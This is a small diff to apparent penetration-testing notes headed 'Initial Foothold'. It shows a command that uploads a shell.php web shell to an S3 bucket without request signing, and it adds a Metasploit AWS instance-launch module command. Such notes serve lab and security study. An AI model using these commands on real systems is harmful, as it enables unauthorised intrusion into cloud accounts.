@@ -1,6 +1,12 @@
 # 03 - Initial Foothold
 
-`$ aws s3 --no-sign-request cp shell.php s3://<s3_bucket_IP>`
+```
+$ aws s3 --no-sign-request cp shell.php s3://<s3_bucket_IP>
+```
+
+```
+msf > use auxiliary/admin/aws/aws_launch_instances
+```
 
 ---
 ## References
